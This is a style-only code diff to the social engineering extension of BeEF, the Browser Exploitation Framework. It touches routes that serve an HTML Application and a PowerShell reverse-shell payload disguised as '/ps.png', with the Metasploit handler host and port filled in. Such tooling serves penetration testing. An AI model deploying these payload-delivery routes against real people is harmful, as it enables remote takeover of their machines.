@@ -6,7 +6,6 @@
 module BeEF
   module Extension
     module SocialEngineering
-
       #
       # NOTE: the powershell_payload is work/copyright from @mattifestation (kudos for that)
       # NOTE: the visual-basic macro code inside the Microsoft Office Word/Excel documents is work/copyright from @enigma0x3 (kudos for that)
@@ -27,7 +26,7 @@ module BeEF
 
         # serves the HTML Application (HTA)
         get '/hta' do
-          response['Content-Type'] = "application/hta"
+          response['Content-Type'] = 'application/hta'
           @config = BeEF::Core::Configuration.instance
           beef_url_str = @config.beef_url_str
           ps_url = @config.get('beef.extension.social_engineering.powershell.powershell_handler_url')
@@ -43,7 +42,7 @@ module BeEF
         # serves the powershell payload after modifying LHOST/LPORT
         # The payload gets served via HTTP by default. Serving it via HTTPS it's still a TODO
         get '/ps.png' do
-          response['Content-Type'] = "text/plain"
+          response['Content-Type'] = 'text/plain'
 
           @ps_lhost = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.msf_reverse_handler_host')
           @ps_port = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.msf_reverse_handler_port')
@@ -51,9 +50,7 @@ module BeEF
           ps_payload_path = "#{$root_dir}/extensions/social_engineering/powershell/powershell_payload"
 
           ps_payload = ''
-          if File.exist?(ps_payload_path)
-            ps_payload = File.read(ps_payload_path).gsub("___LHOST___", @ps_lhost).gsub("___LPORT___", @ps_port)
-          end
+          ps_payload = File.read(ps_payload_path).gsub('___LHOST___', @ps_lhost).gsub('___LPORT___', @ps_port) if File.exist?(ps_payload_path)
           ps_payload
         end
       end
